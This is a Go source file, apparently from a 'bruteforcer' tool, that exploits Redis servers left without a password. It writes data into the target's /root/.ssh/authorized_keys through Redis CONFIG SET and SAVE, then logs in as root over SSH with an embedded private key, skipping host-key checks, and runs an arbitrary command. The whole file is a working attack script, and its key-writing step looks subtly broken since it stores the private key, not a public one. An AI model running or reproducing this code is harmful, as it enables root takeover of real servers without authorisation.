package exp

import (
	"bruteforcer/Global"
	"bruteforcer/utils"
	"fmt"
	"github.com/go-redis/redis"
	"golang.org/x/crypto/ssh"
	"net"
	"strings"
	"time"
)

var REDISthreadN = 0

func sshOpenCheck(host string) bool {
	dial, connecterr := net.Dial("tcp", host+":22")
	if dial != nil {
		defer func() {
			_ = dial.Close()
		}()
	}
	if dial == nil {
		return false
	}
	_ = dial.SetReadDeadline(time.Now().Add(3 * time.Second))
	if connecterr != nil {
	}
	buf := [64]byte{}
	n, _ := dial.Read(buf[:])

	if strings.Contains(string(buf[:n]), "SSH") {
		return true
	}

	return false
}

func REDISUnauthorizedEXP(host string, port string, cmd string) {
wait:
	if REDISthreadN <= 10 {
		go func() {
			err := do(host, port, cmd)
			if err != nil {
				if Global.DBG {
					println(fmt.Sprintf("REDIS 未授权利用出现错误 %v:%v-%v ERR:%v", host, port, cmd, err))
				}
				return
			}
		}()
	} else {
		goto wait
	}
}
func do(host string, port string, cmd string) error {
	if !sshOpenCheck(host) {
		return fmt.Errorf("SSHNOTOPEN")
	}
	REDISthreadN++
	defer func() {
		REDISthreadN--
	}()

	randomRedisKey := "asdfewajrfhuaisdyg" // 随机用于写入私钥的字段
	privateKey := "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAuOLUMNNqbNtiGRRqVNc6ScxeFU4VuEoUOexqj6/N/1ks4b3mTZ/4\nUF00lPBs5cz94hVkC6kfQPNtzWJxHtOr41yaz5Nwus4PcvYe8TGYla474HbHiyO/0SY67e\nbGxG2WYTsYCGF+McCapAD0jYrVhPFJhOQC3XLS5Q39vaDC9/QBDRffDY4yiKPEyq/atdzS\nhz2I3zxq5znCSoiW+IhXXXkFvIpdAJhl1Q8ODcC97CnR+KbbmHG5U1QPj6xmTSqkSNiL3z\nsGy2GXyd1PQwYTPKNxpi+EpG4eN6Lg1LMbMdPr4l6syAByPZ3ySfrcDjXyk5Md15nwwST5\nbuD5/eYiUwnxuOw9vEptSGbIsXd4poAXNBFl5aC3oXjyYErVci6sep+tD61DOHOsxUWHef\neopyCRFJj6F/z0JYDczMm5CRTq47AYDsvf0lQNBdsZSZMUXBewlfvbM/cSeftgnfigwCZO\n8ljcq8l3u4sS4AEWuvM1dBGb3K22L+9D6pDlDWOdAAAFkHihtnV4obZ1AAAAB3NzaC1yc2\nEAAAGBALji1DDTamzbYhkUalTXOknMXhVOFbhKFDnsao+vzf9ZLOG95k2f+FBdNJTwbOXM\n/eIVZAupH0Dzbc1icR7Tq+Ncms+TcLrOD3L2HvExmJWuO+B2x4sjv9EmOu3mxsRtlmE7GA\nhhfjHAmqQA9I2K1YTxSYTkAt1y0uUN/b2gwvf0AQ0X3w2OMoijxMqv2rXc0oc9iN88auc5\nwkqIlviIV115BbyKXQCYZdUPDg3Avewp0fim25hxuVNUD4+sZk0qpEjYi987Bsthl8ndT0\nMGEzyjcaYvhKRuHjei4NSzGzHT6+JerMgAcj2d8kn63A418pOTHdeZ8MEk+W7g+f3mIlMJ\n8bjsPbxKbUhmyLF3eKaAFzQRZeWgt6F48mBK1XIurHqfrQ+tQzhzrMVFh3n3qKcgkRSY+h\nf89CWA3MzJuQkU6uOwGA7L39JUDQXbGUmTFFwXsJX72zP3Enn7YJ34oMAmTvJY3KvJd7uL\nEuABFrrzNXQRm9ytti/vQ+qQ5Q1jnQAAAAMBAAEAAAGAJksk8+/2DRHrYZJu65+gfQSNQB\nBqQz9krRKgh548JnVL7H2uo8lMXyjO6UJa68Xnl9oiXJ/sz0EcLvwCvgXNhkv57KB3Ktnf\nLUp44jAJkIcD89vmPJVs917ZucigxrKEASOCOMoonxlrbiicfmyRCPYI6jNnvII52CNruM\nkBWOX7CcE1+9LF+LMi4XBG9oAEQuql3MbgxX+bFGDyFAv5PG0CmSh3VtY50UVK/eI79Bw9\nVykINqznW7D/gByPG9CG18WvScpSf2QvkEZvWhYihESYDjfl75ZMeXBWjAME+4FsGM5B9k\nENLCDHhrwBGCwIDnqF0sAkJRsVekmX0Wg2gX09Z081PMlnJOYT/6TaaAzCc0GbunUD3S9e\nOMOdDsyUJnRvyNhsNeSsI96XkbCznCJi6WNp3f1xPWBPuBYe/T4omHyJYLG0JjdCYUZGNo\nO20HQ1ekxBqVyUnP3daYEcX3bQeLEK7g18wcTb4+NjFYMbsrRIRHBwg9JPKX1b/wApAAAA\nwHrJ6KsmObz3FsFzMh+3UJincy0jbffHHo/+NDB368ns4hUAM5dfb0x+IRTh5iwrEKPzCz\nxY3jh+V6vdMw2Piqg7Qgd7+ve0SLefDbBT/egaCiJrJIe9LCU3P/EqC0sseR/DpM9N0iX6\nJEe9aaO0SFDQCfVMzwU4om1hY0bhtOMJwNp5umZNXBPK0qZPOGmf8cMwezHN+hys9qYZb9\nxE4ErXxsLBKk/vagmw+TkjP1hntsqOoWNUBPY8bvQqxuaf2AAAAMEA8f3P8neTg2fjjpgF\nCYiGUXf9QnIRaaqlX9whs6Lu9TB9tpuncQuRYBGp3oR1kF/PNxtvuGYtkjCWEenJwpDv7D\nUyBLTy2bdm7lFt9zhK94fUYAwJwq7TbH3JYSeEFiOgMwNsqiPpL4gUdwTOyJEODLswbsfi\nffVV2tE205ATjXvWpfvvipBFrOtNCNOU10VvLBwhVT4GGKv9wnnW9S7fGZbeyEn3vY/d3G\ndBd25iTYez6pvSLHXVGbKXoayuuvG7AAAAwQDDlr5/6c4m66eMl90+eqJ8hLrVbS5J4nA1\ny3/eFQUTEHI9hVXl7knQzMBgOyWS0yds3Uo3rr9s+sBtngSvWzvMo89sKSzcVqzp/yianz\n+LmtvkbXvlEklAuerLlDbyxpuEhAgFH1dGf8FVeyi2rSbnFEL3jE5046+9gwGCrUXqF+6C\ne25jDqmmdSX4kPAermhX3sf5FIMJcpLISDJtQeTx5pu9P17bIZitvCwSP11kcGyk4d9mpw\n6vNd1vxSQsHocAAAAWeW91cl9lbWFpbEBleGFtcGxlLmNvbQECAwQF\n-----END OPENSSH PRIVATE KEY-----"
	rdb := redis.NewClient(&redis.Options{
		Addr:     fmt.Sprintf("%v:%v", host, port),
		Password: "", // no password set
		DB:       0,  // use default DB
	})
	pingErr := rdb.Ping().Err()
	if pingErr != nil {
		return pingErr
	} else {
		utils.DBGLOG("认证成功")
	}
	rdb.ConfigSet("stop-writes-on-bgsave-error", "no")
	//这里写入私钥
	rdb.Set(randomRedisKey, privateKey, 500*time.Duration(time.Second))
	rdb.ConfigSet("dir", "/root/.ssh")
	rdb.ConfigSet("dbfilename", "authorized_keys")
	rdb.Save()
	//恢复
	rdb.Del(randomRedisKey)
	rdb.ConfigSet("dir", "/tmp")
	//使用ssh私钥连接并执行命令
	utils.DBGLOG("公钥写入完毕")
	signer, err := ssh.ParsePrivateKey([]byte(privateKey))
	utils.DBGLOG("公钥认证完毕")
	if err != nil && Global.DBG {
		println(fmt.Sprintf("Unable to parse private key: %v", err))
	}
	sshConf := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: time.Duration(5 * time.Second), // ssh连接超时5s
	}
	utils.DBGLOG("SSH连接中")
	sshdial, SSHDialerr := ssh.Dial("tcp", host+":22", sshConf)
	utils.DBGLOG("SSH连接完成")
	if SSHDialerr == nil { //如果建立成功的话
		defer func(sshdial *ssh.Client) { // 关闭ssh通道
			err := sshdial.Close()
			if err != nil && Global.DBG {
				println("ssh通道关闭错误")
			}
		}(sshdial)
	}
	if SSHDialerr == nil && sshdial != nil {

		utils.DBGLOG("SSH连接成功")
		session, sessionerr := sshdial.NewSession()
		if sessionerr != nil { //开启session
			utils.DBGLOG("SESSION 开启错误")
			return sessionerr
		}
		defer func(session *ssh.Session) { // 关闭session
			err := session.Close()
			if err != nil && Global.DBG {
				println("session关闭错误")
			}
		}(session)
		//ssh操作
		shellOutput, runerr := session.CombinedOutput(cmd)
		if runerr == nil {
			utils.DBGLOG("SSH执行成功")
			fmt.Printf("REDIS->SSH %v:%v-%v=%v", host, port, cmd, string(shellOutput))
		} else {
			utils.DBGLOG(fmt.Sprintf("命令%v运行错误", cmd))
			return runerr
		}

	} else {
		utils.DBGLOG("SSH连接失败")
		return SSHDialerr
	}
	return nil
}
